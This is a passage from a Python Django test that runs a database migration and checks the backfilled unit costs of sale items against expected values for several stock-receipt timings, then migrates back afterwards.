                    sale=sale, line_number=0, product=product, name=product.name, unit="UN", quantity_milli=1000,
                    unit_price_cents=1000, gross_cents=1000, discount_cents=0, line_total_cents=1000).pk
            executor = MigrationExecutor(connection)
            executor.migrate(after)
            SaleItemNew = executor.loader.project_state(after).apps.get_model("core", "SaleItem")
            costs = {label: SaleItemNew.objects.get(pk=pk).unit_cost_cents for label, pk in items.items()}
            self.assertEqual(costs, {"before_any_receipt": 700, "between_receipts": 500, "after_receipts": 650,
                                     "never_received": 200})
        finally:
            executor = MigrationExecutor(connection)
            executor.migrate(executor.loader.graph.leaf_nodes())
